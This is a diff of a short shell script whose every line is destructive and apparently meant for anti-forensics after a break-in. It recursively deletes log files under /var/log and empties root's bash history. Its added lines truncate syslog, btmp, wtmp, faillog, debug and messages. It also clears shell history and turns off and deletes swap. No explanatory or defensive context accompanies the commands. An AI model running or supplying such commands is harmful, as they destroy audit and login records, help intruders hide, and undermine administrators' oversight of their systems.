@@ -1,9 +1,13 @@
 rm -rf /var/log/*.log
 rm -rf /var/log/*.gz
 rm -rf /var/log/*.1
-rm -rf /var/log/*.2
-echo "" > /root/.ssh/authorized_keys
 echo "" > /root/.ssh/.bash_history
+echo "" > /var/log/syslog
+echo "" > /var/log/btmp
+echo "" > /var/log/wtmp
+echo "" > /var/log/debug
+echo "" > /var/log/faillog
+echo "" > /var/log/messages
 history -c
 swapoff -a
 rm /swapfile
